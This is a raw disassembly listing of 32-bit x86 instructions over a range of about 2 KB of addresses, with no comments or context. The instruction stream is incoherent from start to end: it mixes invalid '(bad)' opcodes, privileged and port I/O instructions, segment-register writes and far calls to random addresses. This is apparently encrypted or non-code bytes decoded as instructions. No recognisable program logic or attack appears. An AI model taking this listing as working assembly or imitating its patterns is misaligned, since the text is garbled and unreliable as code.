  412f20:	loope  0x412ef0
  412f22:	mov    edx,0x9c20af7d
  412f27:	push   edi
  412f28:	test   DWORD PTR [edx-0x6b5a81fa],edi
  412f2e:	mov    dh,0x4f
  412f30:	mov    esp,0xe61205d2
  412f35:	mov    ebp,0xfeee76be
  412f3a:	jns    0x412f55
  412f3c:	mov    db3,edi
  412f3f:	sbb    ebp,esp
  412f41:	jmp    0x13d268c8
  412f46:	sahf   
  412f47:	inc    edx
  412f48:	into   
  412f49:	test   al,0x53
  412f4b:	dec    DWORD PTR [ebp*2+0x5fbfa60a]
  412f52:	sub    dh,ch
  412f54:	jp     0x412f10
  412f56:	push   ss
  412f57:	les    eax,FWORD PTR [esp+ebx*2]
  412f5a:	cld    
  412f5b:	clc    
  412f5c:	into   
  412f5d:	in     al,0xd9
  412f5f:	into   
  412f60:	int3   
  412f61:	loopne 0x412f87
  412f63:	lahf   
  412f64:	adc    al,0x3c
  412f66:	mov    ch,0x22
  412f68:	shl    DWORD PTR [esi-0x50bb4820],0xb7
  412f6f:	call   0xc9c2:0x5bb98d3d
  412f76:	les    ebx,FWORD PTR [esi-0x641bb3e0]
  412f7c:	jg     0x412f52
  412f7e:	mov    cs,WORD PTR [edi+0x15]
  412f81:	dec    edx
  412f82:	dec    ecx
  412f83:	pop    esi
  412f84:	dec    esi
  412f85:	push   esi
  412f86:	inc    esp
  412f87:	mov    DWORD PTR [eax+0x72e5c078],esp
  412f8d:	enter  0x5253,0x40
  412f91:	jle    0x412fb4
  412f93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f94:	pop    ebx
  412f95:	inc    eax
  412f96:	aad    0x7f
  412f98:	cmp    edi,DWORD PTR [ebp+eax*4+0x6295315d]
  412f9f:	dec    ebp
  412fa0:	test   DWORD PTR [ecx+0xa],edx
  412fa3:	(bad)  [ecx+0x2aa19230]
  412fa9:	out    dx,al
  412faa:	cmc    
  412fab:	jecxz  0x413021
  412fad:	and    eax,0x9f7726be
  412fb2:	pop    es
  412fb3:	aaa    
  412fb4:	mov    cl,0xc9
  412fb6:	push   DWORD PTR [ecx+0x636a426d]
  412fbc:	inc    esp
  412fbd:	pop    esp
  412fbe:	mov    al,ds:0xc06def80
  412fc3:	xchg   BYTE PTR [edi+ebp*8-0x2c22e50c],ch
  412fca:	sar    DWORD PTR [edi],0x97
  412fcd:	xor    DWORD PTR [ecx+0x6451149c],ecx
  412fd3:	call   0x2b5406e1
  412fd8:	xchg   BYTE PTR [esi],ah
  412fda:	pushf  
  412fdb:	push   ebx
  412fdc:	hlt    
  412fdd:	repnz leave 
  412fdf:	frstor [edi+0x72]
  412fe2:	bnd jp 0x412f72
  412fe5:	mov    edx,0xb76dac74
  412feb:	push   esp
  412fec:	push   ecx
  412fed:	push   ebx
  412fee:	enter  0xe0e9,0xd5
  412ff2:	jp     0x412f87
  412ff4:	sbb    eax,0xbc6e173f
  412ff9:	inc    edi
  412ffa:	and    al,dl
  412ffc:	push   0x669bf07f
  413001:	push   ecx
  413002:	xor    BYTE PTR [ecx-0x6ae30e16],cl
  413008:	adc    al,0x4a
  41300a:	cmp    eax,0x101c7d1e
  41300f:	mov    eax,DWORD PTR ds:0x5930263f
  413015:	mov    ch,0xd8
  413017:	mov    al,ds:0x2add8954
  41301c:	mov    esp,0x73bd77f1
  413021:	bound  ecx,QWORD PTR [ebp+ebp*4-0x7a3687b3]
  413028:	mov    ebp,0x8f12660d
  41302d:	mov    ch,0xcf
  41302f:	add    esi,DWORD PTR ds:0x2ad065fb
  413035:	jge    0x413093
  413037:	jnp    0x412ff1
  413039:	clc    
  41303a:	push   eax
  41303b:	xlat   BYTE PTR ds:[ebx]
  41303c:	(bad)
  413040:	mov    dh,0x60
  413042:	enter  0xfa76,0xf2
  413046:	push   edi
  413047:	sub    BYTE PTR [ecx],dh
  413049:	xchg   al,dl
  41304b:	icebp  
  41304c:	mov    al,ds:0xeb011b52
  413051:	or     al,bl
  413053:	ins    DWORD PTR es:[edi],dx
  413054:	and    ah,BYTE PTR [edx]
  413056:	loop   0x412ff9
  413058:	mov    ah,BYTE PTR [esi-0x7c22ef15]
  41305e:	xor    esi,DWORD PTR [esi]
  413060:	lds    edx,FWORD PTR [ebx+eiz*1]
  413063:	xor    ebx,edi
  413065:	fdivr  st,st(4)
  413067:	cdq    
  413068:	mov    cl,0x66
  41306a:	ror    DWORD PTR [edx+0x280b60fa],0x37
  413071:	pop    ebx
  413072:	mov    DWORD PTR [eax-0x5aa596cb],ebx
  413078:	scas   al,BYTE PTR es:[edi]
  413079:	push   es
  41307a:	or     DWORD PTR [eax-0x607d146f],ecx
  413080:	or     BYTE PTR [ebx-0xe9a7f39],ch
  413086:	popf   
  413087:	repz fadd DWORD PTR [esi+0x6e]
  41308b:	or     dl,BYTE PTR [edx-0x3a]
  41308e:	sub    ecx,0x2f
  413091:	mov    edi,0x28776429
  413096:	retf   
  413097:	loop   0x41305e
  413099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41309a:	inc    DWORD PTR [edi+0x4d]
  41309d:	aad    0x90
  41309f:	rcr    esi,0x94
  4130a2:	repnz popa 
  4130a4:	scas   eax,DWORD PTR es:[edi]
  4130a5:	clc    
  4130a6:	dec    edx
  4130a7:	neg    BYTE PTR [eax-0x4f]
  4130aa:	pop    ecx
  4130ab:	div    BYTE PTR [ecx-0x1e]
  4130ae:	scas   al,BYTE PTR es:[edi]
  4130af:	mov    WORD PTR [esi-0x77],?
  4130b2:	out    0x63,al
  4130b4:	fistp  WORD PTR [ebx]
  4130b6:	pop    ds
  4130b7:	mov    DWORD PTR [ebx-0x5f],edi
  4130ba:	push   es
  4130bb:	and    DWORD PTR [esi],esp
  4130bd:	jns    0x41313a
  4130bf:	xchg   ebx,eax
  4130c0:	pop    ss
  4130c1:	jo     0x413051
  4130c3:	jne    0x4130e2
  4130c5:	dec    eax
  4130c6:	dec    DWORD PTR [edx]
  4130c8:	stos   BYTE PTR es:[edi],al
  4130c9:	fs cli 
  4130cb:	xchg   ebx,eax
  4130cc:	loopne 0x41313c
  4130ce:	xchg   BYTE PTR [esi-0x69],al
  4130d1:	mov    dl,0x5
  4130d3:	fidiv  DWORD PTR [ecx-0x3b]
  4130d6:	popa   
  4130d7:	loop   0x4130d0
  4130d9:	dec    ecx
  4130da:	dec    ecx
  4130db:	out    dx,al
  4130dc:	pop    ecx
  4130dd:	repz add edi,DWORD PTR [esi+0x75]
  4130e1:	in     al,dx
  4130e2:	cmp    bl,dh
  4130e4:	(bad)  
  4130e5:	adc    cl,bh
  4130e7:	nop
  4130e8:	(bad)
  4130eb:	cmp    esp,DWORD PTR [esi]
  4130ed:	push   esi
  4130ee:	jecxz  0x413151
  4130f0:	mov    cl,BYTE PTR [esi+0x51]
  4130f3:	jmp    0xbae3ba5
  4130f8:	cld    
  4130f9:	vmwrite edx,DWORD PTR [eax+0x3f]
  4130fd:	and    edi,DWORD PTR [eax]
  4130ff:	sti    
  413100:	retf   
  413101:	push   es
  413102:	push   0xffffffda
  413104:	sbb    bh,BYTE PTR [eax]
  413106:	dec    edx
  413107:	or     ch,bh
  413109:	popf   
  41310a:	bound  edi,QWORD PTR [esi]
  41310c:	pushf  
  41310d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41310f:	jbe    0x4130cd
  413111:	scas   eax,DWORD PTR es:[edi]
  413112:	std    
  413113:	mov    ecx,edx
  413115:	scas   al,BYTE PTR es:[edi]
  413116:	jbe    0x413169
  413118:	and    BYTE PTR [ecx-0x6c],bl
  41311b:	arpl   bp,sp
  41311d:	adc    eax,DWORD PTR [edx]
  41311f:	js     0x4130dd
  413121:	cld    
  413122:	push   esi
  413123:	lds    ecx,FWORD PTR [ecx]
  413125:	gs inc ebx
  413127:	push   0x2d6c6bf4
  41312c:	cmc    
  41312d:	sbb    ebx,0xffffffb6
  413130:	ins    DWORD PTR es:[edi],dx
  413131:	push   ecx
  413132:	clc    
  413133:	shl    DWORD PTR [ecx+0x7599d72f],cl
  413139:	mov    ecx,0xf62192ee
  41313e:	sbb    edx,DWORD PTR [esi+0x64df832e]
  413144:	out    0xb5,al
  413146:	add    DWORD PTR [edx],eax
  413148:	mov    edx,0x868390dc
  41314d:	lahf   
  41314e:	jmp    0x413185
  413150:	cmp    edi,DWORD PTR [esp+ebp*2]
  413153:	push   0x32
  413155:	aad    0xe
  413157:	mov    ah,0x5b
  413159:	hlt    
  41315a:	lahf   
  41315b:	sbb    eax,0xf150c56c
  413160:	in     al,0xd0
  413162:	mov    BYTE PTR ds:0xcaed1f90,0xb
  413169:	shl    BYTE PTR [edi+esi*1-0x25486e63],0x9f
  413171:	or     eax,0xf55cd1e5
  413176:	push   ebp
  413177:	lea    ecx,[edi-0xe]
  41317a:	pop    esi
  41317b:	fistp  DWORD PTR [eax]
  41317d:	push   es
  41317e:	mov    esi,0x4a4f1709
  413183:	sbb    eax,0x5b6520dc
  413188:	das    
  413189:	lods   eax,DWORD PTR ds:[esi]
  41318a:	imul   ecx,edx,0x20
  41318d:	sub    al,0xc0
  41318f:	ror    edi,1
  413191:	push   es
  413192:	loope  0x41317d
  413194:	je     0x4131d4
  413196:	(bad)
  41319a:	addr16 cmc 
  41319c:	push   edi
  41319d:	and    edx,DWORD PTR [edx]
  41319f:	jl     0x4131a3
  4131a1:	adc    eax,0x9ee237ed
  4131a6:	aad    0xe
  4131a8:	int3   
  4131a9:	dec    edi
  4131aa:	fdivr  QWORD PTR [ebp+0x23]
  4131ad:	fwait
  4131ae:	lock lods eax,DWORD PTR ds:[esi]
  4131b0:	inc    edi
  4131b1:	cld    
  4131b2:	sub    al,0x20
  4131b4:	in     eax,0x51
  4131b6:	xchg   edx,esi
  4131b8:	pop    ds
  4131b9:	or     esp,DWORD PTR [ecx-0x3e]
  4131bc:	call   0x65e28549
  4131c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131c2:	push   edx
  4131c3:	inc    edx
  4131c4:	call   0xd196e0cf
  4131c9:	and    edx,DWORD PTR [edx-0x23]
  4131cc:	sbb    BYTE PTR [ecx],dl
  4131ce:	test   esp,esi
  4131d0:	scas   al,BYTE PTR es:[edi]
  4131d1:	pop    eax
  4131d2:	and    al,bh
  4131d4:	sahf   
  4131d5:	xchg   DWORD PTR [eax+0x1722e081],ebx
  4131db:	fprem1 
  4131dd:	les    edi,FWORD PTR [edi-0x3a8af80c]
  4131e3:	ss or  eax,0x5178e763
  4131e9:	je     0x4131fd
  4131eb:	imul   eax,DWORD PTR [esi+0x2b],0xffffffbd
  4131ef:	ret    
  4131f0:	cmp    edi,DWORD PTR [ecx]
  4131f2:	inc    ebp
  4131f3:	add    al,0xa2
  4131f5:	inc    esp
  4131f6:	imul   edx,ebx,0xffffffb7
  4131f9:	pop    ecx
  4131fa:	icebp  
  4131fb:	mov    ecx,0x50b3ddd7
  413200:	aad    0x1b
  413202:	or     eax,DWORD PTR [ecx]
  413204:	out    0xfb,eax
  413206:	push   edi
  413207:	and    al,0x5c
  413209:	leave  
  41320a:	and    ecx,DWORD PTR [ebx+0x6d]
  41320d:	retf   0x6b1c
  413210:	jmp    0x6cb3:0x289e516f
  413217:	cmp    ebx,ebx
  413219:	pop    edx
  41321a:	clc    
  41321b:	and    BYTE PTR [edi+0x3f],al
  41321e:	js     0x4131eb
  413220:	mov    DWORD PTR ds:0x9b2066b3,esp
  413226:	sbb    al,0x39
  413228:	ins    DWORD PTR es:[edi],dx
  413229:	add    DWORD PTR [ecx],ebx
  41322b:	popa   
  41322c:	fist   DWORD PTR [ecx+0x405104b2]
  413232:	lock jno 0x413280
  413235:	adc    edi,esp
  413237:	push   esp
  413238:	and    al,0x4e
  41323a:	ins    BYTE PTR es:[edi],dx
  41323b:	inc    ebx
  41323c:	push   ss
  41323d:	adc    DWORD PTR [ecx+0x1c0c7c8],0x50
  413244:	xchg   DWORD PTR [esi+0x19],esp
  413247:	mov    esi,0xf4575707
  41324c:	(bad)  
  41324d:	push   ds
  41324e:	push   edx
  41324f:	pop    eax
  413250:	xchg   ebp,eax
  413251:	lahf   
  413252:	scas   al,BYTE PTR es:[edi]
  413253:	push   ecx
  413254:	arpl   cx,di
  413256:	dec    eax
  413257:	mov    edx,0xacdb5aa0
  41325c:	es into 
  41325e:	mov    al,0x31
  413260:	mov    al,ds:0xee5e02e5
  413265:	lods   eax,DWORD PTR ds:[esi]
  413266:	pop    eax
  413267:	sub    BYTE PTR [edx-0x1e],dl
  41326a:	sbb    eax,0x1ab18ef2
  41326f:	mov    edx,0xfa172af6
  413274:	aam    0xa
  413276:	inc    edi
  413277:	or     al,0xd8
  413279:	loopne 0x4132be
  41327b:	xor    al,0xc7
  41327d:	repz pop esi
  41327f:	sub    eax,0x9c4828a
  413284:	adc    BYTE PTR [ecx-0x62],bl
  413287:	test   al,0x76
  413289:	inc    ebx
  41328a:	test   BYTE PTR [edx-0x6af49e6f],cl
  413290:	jno    0x413220
  413292:	aaa    
  413293:	jns    0x41330b
  413295:	xchg   edi,eax
  413296:	sbb    BYTE PTR [ebx+0x53974ad],al
  41329c:	pushaw 
  41329e:	jle    0x413314
  4132a0:	fisttp DWORD PTR [esi]
  4132a2:	aam    0x17
  4132a4:	jl     0x413266
  4132a6:	cli    
  4132a7:	in     eax,0x3c
  4132a9:	cmp    BYTE PTR [eax+ebx*8+0x2e832426],dl
  4132b0:	clc    
  4132b1:	arpl   WORD PTR [ecx+ebx*2-0x11fa23c0],dx
  4132b8:	jle    0x413251
  4132ba:	enter  0x142f,0xc5
  4132be:	test   eax,0xa81d6810
  4132c3:	(bad)  
  4132c5:	pushf  
  4132c6:	sub    ebx,ebp
  4132c8:	lods   eax,DWORD PTR ds:[esi]
  4132c9:	adc    bh,bh
  4132cb:	add    eax,0xd11a46d9
  4132d0:	jb     0x413322
  4132d2:	rcl    edx,cl
  4132d4:	ja     0x4132fd
  4132d6:	dec    ebx
  4132d7:	mov    bl,0x0
  4132d9:	ror    esi,0x36
  4132dc:	and    esi,DWORD PTR [edi]
  4132de:	adc    edx,esi
  4132e0:	adc    ch,BYTE PTR [edi+0x2bc9ee92]
  4132e6:	ins    DWORD PTR es:[edi],dx
  4132e7:	ins    DWORD PTR es:[edi],dx
  4132e8:	jle    0x4132d4
  4132ea:	test   al,0xd4
  4132ec:	repnz mov BYTE PTR [ebp+0x71],0x55
  4132f1:	outs   dx,BYTE PTR ds:[esi]
  4132f2:	inc    eax
  4132f3:	jns    0x413319
  4132f5:	inc    ebx
  4132f6:	push   esi
  4132f7:	and    ecx,eax
  4132f9:	cmp    DWORD PTR [ebx],esp
  4132fb:	push   0xd
  4132fd:	daa    
  4132fe:	mov    ebp,eax
  413300:	fiadd  WORD PTR [ecx+0x496c77aa]
  413306:	daa    
  413307:	retf   0xc844
  41330a:	mov    esi,0x785a8ed3
  41330f:	xchg   DWORD PTR [ebp+0x3e4e81a2],edx
  413315:	icebp  
  413316:	mov    gs,WORD PTR [edi-0x79]
  413319:	pop    ebx
  41331a:	fdiv   st,st(6)
  41331c:	push   eax
  41331d:	loope  0x41339b
  41331f:	std    
  413320:	out    0x9f,eax
  413322:	push   ebx
  413323:	xor    ah,BYTE PTR [edx-0x46]
  413326:	leave  
  413327:	or     al,BYTE PTR [esi-0x79c71471]
  41332d:	inc    ecx
  41332e:	jb     0x4132e5
  413330:	push   ecx
  413331:	inc    BYTE PTR [eax-0x6da12b24]
  413337:	mov    BYTE PTR [ebx],0xcf
  41333a:	sti    
  41333b:	jmp    0x41339f
  41333d:	inc    esp
  41333e:	sub    al,BYTE PTR [edx]
  413340:	es cs jmp 0x1058:0x6f4b4dc8
  413349:	scas   al,BYTE PTR es:[edi]
  41334a:	fdivp  st(6),st
  41334c:	xchg   esp,eax
  41334d:	fst    DWORD PTR [edi-0x1edfb798]
  413353:	pop    ecx
  413354:	add    eax,0xdd7d6e55
  413359:	dec    eax
  41335a:	sbb    BYTE PTR ss:[eax+0x20],cl
  41335e:	sub    ah,BYTE PTR [edx]
  413360:	xchg   BYTE PTR ds:0x53a1f70e,ah
  413366:	push   edx
  413367:	push   eax
  413368:	sti    
  413369:	jp     0x413318
  41336b:	sbb    eax,DWORD PTR [eax]
  41336d:	daa    
  41336e:	xchg   ebx,eax
  41336f:	scas   al,BYTE PTR es:[edi]
  413370:	in     eax,0xdb
  413372:	cmp    BYTE PTR [ecx-0x5dd211d3],cl
  413378:	push   edx
  413379:	jno    0x413345
  41337b:	inc    ecx
  41337c:	xchg   ebp,eax
  41337d:	out    dx,al
  41337e:	jno    0x413350
  413380:	lock je 0x4133de
  413383:	repz cmp ebp,esi
  413386:	dec    edi
  413387:	add    BYTE PTR [edx],cl
  413389:	jmp    0x3134e217
  41338e:	sbb    dl,BYTE PTR [ebx-0x5f64b330]
  413394:	sahf   
  413395:	pop    esi
  413396:	mov    bl,0x54
  413398:	cmp    BYTE PTR [edx-0xf],dh
  41339b:	sub    eax,0x746ce4b8
  4133a0:	mov    ebp,0x9c1a26e7
  4133a5:	mov    edx,0xa0c16469
  4133ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133ac:	aam    0xba
  4133ae:	adc    cl,cl
  4133b0:	call   0x3803:0x9bf06eed
  4133b7:	and    esi,edx
  4133b9:	out    dx,al
  4133ba:	shl    BYTE PTR [ecx+0x5463651],1
  4133c0:	leave  
  4133c1:	(bad)
  4133c5:	repnz mov ah,0x90
  4133c8:	enter  0x4eb7,0x7b
  4133cc:	fisttp QWORD PTR [ecx+0x4862b7a4]
  4133d2:	cwde   
  4133d3:	push   esp
  4133d4:	pop    edx
  4133d5:	mov    eax,ds:0xf1acd49f
  4133da:	xor    ch,al
  4133dc:	push   ss
  4133dd:	mov    edi,DWORD PTR [edi]
  4133df:	or     DWORD PTR [eax+0x54],0x49440ecc
  4133e6:	add    DWORD PTR [ecx+esi*1],eax
  4133e9:	repz jmp 0xaee2:0xd15210cb
  4133f1:	or     BYTE PTR [eax+0x18707586],0xa
  4133f8:	and    eax,0xe2442260
  4133fd:	ficomp DWORD PTR [edi-0x579b1d66]
  413403:	retf   
  413404:	cmc    
  413405:	ja     0x413434
  413407:	mov    eax,ebx
  413409:	sbb    BYTE PTR [ebx-0x50],cl
  41340c:	cmp    edi,DWORD PTR [edx]
  41340e:	lock aas 
  413410:	xor    edx,ebx
  413412:	mov    ebx,0x12dac3ef
  413417:	shl    DWORD PTR [edi],1
  413419:	mov    dh,0x23
  41341b:	mov    ds:0xf2c6e839,eax
  413420:	jae    0x4133f0
  413422:	sub    BYTE PTR [ebp-0x2d29ec02],bh
  413428:	lahf   
  413429:	loop   0x41343a
  41342b:	into   
  41342c:	add    ebp,edi
  41342e:	xchg   BYTE PTR [esi-0x45],ch
  413431:	sub    al,0x1f
  413433:	call   0x6508365d
  413438:	sbb    BYTE PTR [ebx+0x30],0x27
  41343c:	jge    0x4133e2
  41343e:	dec    ebp
  41343f:	jg     0x413410
  413441:	pop    ebx
  413442:	or     BYTE PTR [ebx+0xa],bl
  413445:	rcr    DWORD PTR [edi],1
  413447:	or     DWORD PTR [ebp-0x6a],ebx
  41344a:	idiv   DWORD PTR [edi+0x2c]
  41344d:	lock clc 
  41344f:	loop   0x413420
  413451:	lock xor DWORD PTR [edx],eax
  413454:	pop    ebp
  413455:	mov    edx,0x1b58368c
  41345a:	xchg   edx,eax
  41345b:	jo     0x413450
  41345d:	pop    eax
  41345e:	sbb    al,0xce
  413460:	xlat   BYTE PTR ds:[ebx]
  413461:	cdq    
  413462:	icebp  
  413463:	leave  
  413464:	lds    ebp,FWORD PTR [esi-0xc50d138]
  41346a:	xchg   esi,eax
  41346b:	inc    esi
  41346c:	jp     0x413430
  41346e:	mov    ecx,0xe02a69e2
  413473:	call   0x5e90:0x3e2be3c4
  41347a:	ds sbb bh,bh
  41347d:	mov    bh,0xb5
  41347f:	inc    eax
  413480:	imul   edx,DWORD PTR [esi+esi*8+0x394aa909],0x96a6259
  41348b:	outs   dx,DWORD PTR ds:[esi]
  41348c:	or     DWORD PTR [eax-0x41],esi
  41348f:	mov    ds:0x174c472b,al
  413494:	test   BYTE PTR [ebp-0x22],0xcb
  413498:	xchg   edi,eax
  413499:	addr16 ret 0x4849
  41349d:	stos   DWORD PTR es:[edi],eax
  41349e:	test   BYTE PTR [ebx-0x1390cdc3],dl
  4134a4:	data16 outs dx,BYTE PTR ds:[esi]
  4134a6:	mov    ebp,0x19ff2942
  4134ab:	inc    ecx
  4134ac:	call   0x7765:0xd2a224b0
  4134b3:	xor    eax,0x67ae9ce6
  4134b8:	cmc    
  4134b9:	pop    esp
  4134ba:	ret    
  4134bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134bc:	nop
  4134bd:	jecxz  0x41352a
  4134bf:	dec    eax
  4134c0:	inc    edi
  4134c1:	into   
  4134c2:	pop    ss
  4134c3:	call   0x9d50:0xa21554e5
  4134ca:	and    eax,esi
  4134cc:	jbe    0x41349b
  4134ce:	push   ss
  4134cf:	adc    al,0x79
  4134d1:	mov    ecx,DWORD PTR ds:0x7a43e921
  4134d7:	sub    DWORD PTR [ecx+0x0],eax
  4134da:	jmp    0x41353a
  4134dc:	push   esi
  4134dd:	and    esi,ebx
  4134df:	outs   dx,BYTE PTR ds:[esi]
  4134e0:	js     0x413485
  4134e2:	bound  eax,QWORD PTR [esi+0x255fa507]
  4134e8:	xchg   BYTE PTR [eax],cl
  4134ea:	(bad)  
  4134eb:	mov    ebx,0x91d6be3
  4134f0:	sbb    eax,0x29c0d9bb
  4134f5:	push   ecx
  4134f6:	xor    BYTE PTR ds:0xd12478d6,0xfe
  4134fd:	mov    cl,0xb8
  4134ff:	inc    edi
  413500:	rcl    DWORD PTR [esi],cl
  413502:	shl    DWORD PTR [edi+0x8b24b28],0x3f
  413509:	ficom  WORD PTR [esi]
  41350b:	fsubr  st(5),st
  41350d:	shrd   DWORD PTR [eax+ebp*1],ecx,0x4
  413512:	test   DWORD PTR ds:[esi],ebp
  413515:	popa   
  413516:	pop    esp
  413517:	sub    eax,0xf1074577
  41351c:	dec    edi
  41351d:	dec    edi
  41351e:	and    eax,0x984c2f65
  413523:	adc    esi,0x48
  413526:	and    ecx,0x50
  413529:	fwait
  41352a:	adc    esi,ebp
  41352c:	fisubr WORD PTR [edx+0x2629c5a9]
  413532:	pop    eax
  413533:	sbb    ebx,esi
  413535:	clc    
  413536:	jl     0x41355e
  413538:	lahf   
  413539:	lock call 0x5e757845
  41353f:	push   esp
  413540:	sub    BYTE PTR [esi-0x55159fdd],cl
  413546:	lods   eax,DWORD PTR ds:[esi]
  413547:	stos   BYTE PTR es:[edi],al
  413548:	inc    edx
  413549:	sub    eax,0x4c1697b0
  41354e:	dec    eax
  41354f:	icebp  
  413550:	lods   al,BYTE PTR ds:[esi]
  413551:	mov    esp,0x95565d24
  413556:	dec    ebx
  413557:	rol    edx,0x97
  41355a:	pop    ebx
  41355b:	jo     0x41355d
  41355d:	or     al,0x2e
  413560:	push   edi
  413561:	ret    0x1743
  413564:	push   ecx
  413565:	call   0x58eb70df
  41356a:	pop    esi
  41356b:	(bad)  
  41356c:	in     al,dx
  41356d:	(bad)  
  41356e:	aad    0x83
  413570:	hlt    
  413571:	cld    
  413572:	mov    edi,DWORD PTR [edx]
  413574:	cmp    al,0xb5
  413576:	push   edx
  413577:	int3   
  413578:	ins    BYTE PTR es:[edi],dx
  413579:	inc    ecx
  41357a:	(bad)  
  41357b:	ins    DWORD PTR es:[edi],dx
  41357c:	mov    edx,0x149a050a
  413581:	sbb    eax,0x76dc7e01
  413586:	fisubr WORD PTR [edx-0x43]
  413589:	mov    edx,0xe942e9fb
  41358e:	mov    ebp,DWORD PTR [ebp+0x33025a1a]
  413594:	sbb    DWORD PTR [edi-0x5],ecx
  413597:	std    
  413598:	test   BYTE PTR [ebp+eiz*1-0x4416743a],al
  41359f:	clc    
  4135a0:	push   0x62
  4135a2:	jbe    0x413590
  4135a4:	(bad)  
  4135a5:	or     al,0x13
  4135a7:	fwait
  4135a8:	xor    al,0xac
  4135aa:	dec    esi
  4135ab:	cmp    ah,dh
  4135ad:	mov    al,0x4a
  4135af:	dec    ebx
  4135b0:	stc    
  4135b1:	mov    edi,0x878313b9
  4135b6:	mov    dl,0x1d
  4135b8:	pop    edx
  4135b9:	and    esp,DWORD PTR [ecx-0x385a1d43]
  4135bf:	in     eax,0x23
  4135c1:	sub    eax,0xa52cefb5
  4135c6:	loopne 0x4135f8
  4135c8:	dec    ecx
  4135c9:	test   dh,bh
  4135cb:	loope  0x4135f3
  4135cd:	sti    
  4135ce:	fisub  DWORD PTR [ecx-0x68]
  4135d1:	outs   dx,DWORD PTR ds:[esi]
  4135d2:	ret    0x6847
  4135d5:	mov    BYTE PTR [ebp+edi*4+0xc],al
  4135d9:	mov    bl,0x2b
  4135db:	lods   al,BYTE PTR ds:[esi]
  4135dc:	ins    DWORD PTR es:[edi],dx
  4135dd:	mov    al,0x52
  4135df:	js     0x413651
  4135e1:	ja     0x41361d
  4135e3:	inc    ebp
  4135e4:	cmp    dl,BYTE PTR [ebx-0x32]
  4135e7:	sub    eax,0x4f9d3aea
  4135ec:	dec    edx
  4135ed:	ret    0x7a0e
  4135f0:	rcl    DWORD PTR [ecx+eiz*2],1
  4135f3:	pusha  
  4135f4:	add    cl,BYTE PTR [ebx+0x43b064bb]
  4135fa:	adc    esp,DWORD PTR [ecx+0x50]
  4135fd:	mov    ecx,0xe773fb27
  413602:	pop    edx
  413603:	xchg   ebp,eax
  413604:	mov    edx,0x5eb879d3
  413609:	or     ah,BYTE PTR [esi+eax*4]
  41360c:	(bad)  
  41360e:	sub    ecx,DWORD PTR [esi+0x60c33bd0]
  413614:	cld    
  413615:	or     eax,0x6dedb5dc
  41361a:	out    dx,eax
  41361b:	add    BYTE PTR [eax+0x473bb64],0x82
  413622:	push   ebx
  413623:	mov    WORD PTR [esp+eax*2],ss
  413626:	(bad)  [edi+0x5b]
  413629:	mov    DWORD PTR [edx],esi
  41362b:	imul   ecx,edx,0xa5d2a0bc
  413631:	lods   eax,DWORD PTR ds:[esi]
  413632:	fcmovnu st,st(5)
  413634:	adc    BYTE PTR [esi-0x251ebc5d],dh
  41363a:	dec    eax
  41363b:	sub    eax,0x71a64d90
  413640:	add    eax,0x256001e4
  413645:	mov    BYTE PTR [edi+0x1b],ah
  413648:	cmp    al,0x48
  41364a:	adc    al,0xd3
  41364c:	xchg   ecx,eax
  41364d:	push   cs
  41364e:	mov    ah,0xb0
  413650:	lods   al,BYTE PTR ds:[esi]
  413651:	cmc    
  413652:	adc    BYTE PTR [edx+0x1],ah
  413655:	push   0xffffff90
  413657:	std    
  413658:	push   0xc12a0637
  41365d:	mul    DWORD PTR [esi-0x68]
  413660:	inc    DWORD PTR ds:0x46b1f488
  413666:	sbb    edi,edx
  413668:	xchg   ecx,eax
  413669:	xor    eax,0xfa1f13d3
  41366e:	not    DWORD PTR [eax]
  413670:	cdq    
  413671:	ins    BYTE PTR es:[edi],dx
  413672:	mov    dh,0xb7
  413674:	jge    0x41366c
  413676:	in     eax,0x9d
  413678:	je     0x413614
  41367a:	xchg   ebx,eax
  41367b:	jecxz  0x413697
  41367d:	sub    edi,DWORD PTR [edx]
  41367f:	gs jns 0x4136d8
  413682:	jmp    0x5347bd31
  413687:	jecxz  0x41366d
  413689:	push   0xfffffffa
  41368b:	into   
  41368c:	cmp    esi,DWORD PTR [eax]
  41368e:	adc    eax,0xcd82e992
  413693:	mov    esp,DWORD PTR [ebp+0x72]
  413696:	lods   eax,DWORD PTR ds:[esi]
  413697:	pop    esp
  413698:	ret    
  413699:	push   ss
  41369a:	inc    ecx
  41369b:	jmp    0x1671a9a2
  4136a0:	push   ecx
  4136a1:	mov    cl,0xc5
  4136a3:	adc    bh,bh
  4136a5:	push   eax
  4136a6:	sub    bh,BYTE PTR [ecx-0x1f4ba68d]
  4136ac:	retf   0x9212
  4136af:	aad    0x3c
  4136b1:	pop    ds
  4136b2:	dec    esi
  4136b3:	or     al,0xa3
  4136b5:	pop    eax
  4136b6:	jp     0x4136d2
  4136b8:	(bad)  [ecx]
  4136ba:	jns    0x4136e1
  4136bc:	xchg   BYTE PTR [ebp+0x5f524bad],al
  4136c2:	pushf  
  4136c3:	in     eax,0xd2
  4136c5:	movzx  ebp,dh
  4136c8:	leave  
  4136c9:	in     eax,0x72
  4136cb:	sub    ah,BYTE PTR [edx+0x37]
  4136ce:	xor    DWORD PTR [ebx],esp
  4136d0:	mov    edi,0xb14edcf6
  4136d5:	mov    ss,WORD PTR [esp+ecx*1-0x22aad8f4]
  4136dc:	les    ebp,FWORD PTR [esi-0x17]
  4136df:	push   es
  4136e0:	lea    ebp,[eax+0x59]
  4136e3:	xchg   DWORD PTR [ebp-0x17ce9da0],edx
  4136e9:	or     ecx,DWORD PTR [esp+edx*8]
  4136ec:	fdivr  st(2),st
  4136ee:	dec    ebx
  4136ef:	imul   edi,DWORD PTR [ebp+0x49],0xffffffb2
  4136f3:	pop    ss
  4136f4:	mov    DWORD PTR [esi-0x28],esp
  4136f7:	call   0xc10b:0x8dcaa2e9
  4136fe:	lea    edi,[eax-0x3d]
  413701:	push   DWORD PTR [ebx+ebp*8+0x6db52cfe]
  413708:	push   es
  413709:	push   edi
  41370a:	pop    esi
  41370b:	dec    esp
  41370c:	jp     0x4136f3
  41370e:	fst    st(7)
  413710:	call   0x633eb77a
  413715:	inc    ebx
  413716:	int    0x5
  413718:	add    dl,0x24
  41371b:	aaa    
  41371c:	retf   0xf236
  41371f:	mov    esp,0x4516fdcb
  413724:	mov    dl,BYTE PTR [edi-0x70057dd6]
  41372a:	sub    BYTE PTR [ebx+0x4d],ch
